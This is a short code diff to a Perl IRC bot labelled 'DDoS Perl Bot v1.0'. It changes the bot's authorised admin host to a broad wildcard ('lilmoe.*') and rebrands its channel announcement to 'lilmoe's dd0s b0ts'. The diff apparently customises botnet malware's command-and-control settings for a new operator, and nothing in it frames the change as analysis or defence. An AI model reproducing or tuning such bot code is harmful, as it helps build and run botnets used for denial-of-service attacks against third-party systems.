@@ -143,7 +143,7 @@ my $homedir = "/tmp";
 my $version = 'DDoS Perl Bot v1.0';
  
 my @admins = ("lilmoe");
-my @hostauth = ("lilmoe.users.undernet.org");
+my @hostauth = ("lilmoe.*");
 my @channels = ("#moey");
  
 my $pacotes = 1;
@@ -370,7 +370,7 @@ elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
   foreach my $canal (@channels) {
         sendraw("MODE $nick +x");
     sendraw("JOIN $canal");
-        sendraw("PRIVMSG $canal :4,1 [alavojda's dd0s b0ts] 9,1Lets DDOSSSS!... ");
+        sendraw("PRIVMSG $canal :4,1 [lilmoes's dd0s b0ts] 9,1Lets DDOSSSS!... ");
 }
 }
 }
